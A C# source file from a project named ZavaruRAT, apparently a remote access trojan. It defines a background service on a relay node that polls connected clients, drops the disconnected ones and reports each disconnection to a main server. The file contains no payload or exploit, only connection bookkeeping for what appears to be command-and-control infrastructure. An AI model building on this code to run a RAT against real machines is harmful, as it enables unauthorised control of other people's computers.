#region

using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Node.Services;

public sealed class ZavaruCheckerService : BackgroundService
{
    private readonly MainServerClient _server;
    private readonly ZavaruClientsStorage _storage;
    private readonly ILogger<ZavaruCheckerService> _logger;

    public ZavaruCheckerService(MainServerClient server, ZavaruClientsStorage storage,
                                ILogger<ZavaruCheckerService> logger)
    {
        _server = server;
        _storage = storage;
        _logger = logger;
    }

    private async Task CheckClientsAsync(CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            // copy list to avoid changes when enumerating
            var clients = _storage.Clients.ToList();

            foreach (var storedClient in clients)
            {
                if (cancellationToken.IsCancellationRequested)
                {
                    break;
                }

                if (storedClient.Client.Connected)
                {
                    continue;
                }

                _storage.RemoveClient(storedClient);
                await _server.SendClientDisconnected(new ClientDisconnectedEvent
                {
                    Id = storedClient.Id.ToString()
                }, cancellationToken);

                _logger.LogInformation("{Client} disconnected", storedClient);
            }

            await Task.Delay(200, cancellationToken);
        }
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Checker started");

        await CheckClientsAsync(stoppingToken);
    }
}
